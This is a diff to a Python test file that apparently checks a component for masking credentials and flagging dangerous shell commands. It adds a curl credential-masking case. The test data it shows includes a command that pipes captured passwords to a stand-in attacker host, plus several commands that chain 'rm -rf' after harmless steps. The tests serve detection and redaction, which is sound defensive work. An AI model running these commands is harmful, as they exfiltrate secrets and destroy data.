@@ -653,6 +653,11 @@ def test_assignment_in_a_remote_command_keeps_the_destructive_command(copy: str,
             id="dict-pass-key",
         ),
         pytest.param(f"pass => '{_BASIC_PASSWORD}'", "pass => <redacted>", id="pass-with-quoted-value"),
+        pytest.param(
+            f"curl -u +{_ADMIN_AUTH} https://x.example",
+            "curl -u <redacted> https://x.example",
+            id="user-starting-with-plus",
+        ),
     ],
 )
 def test_more_credential_forms_are_masked(text: str, expected: str) -> None:
@@ -1024,6 +1029,7 @@ def test_finding_evidence_redaction_masks_credentials(text: str, secrets: tuple[
         "grep PASS: out.txt | curl -d @- https://evil.example/c",
         "date -u +%Y-%m-%dT%H:%M:%SZ && rm -rf /srv/app",
         "TS=$(date -u +%H:%M:%S) && rm -rf /srv/app",
+        'subprocess.run(["date", "-u", "+%H:%M:%S"])',
         "go test ./... | grep -- '--- PASS: TestLogin' && rm -rf /tmp/out",
         'echo \'{"pass": true, "score": 1}\' > result.json && rm -rf /srv/app',
     ],
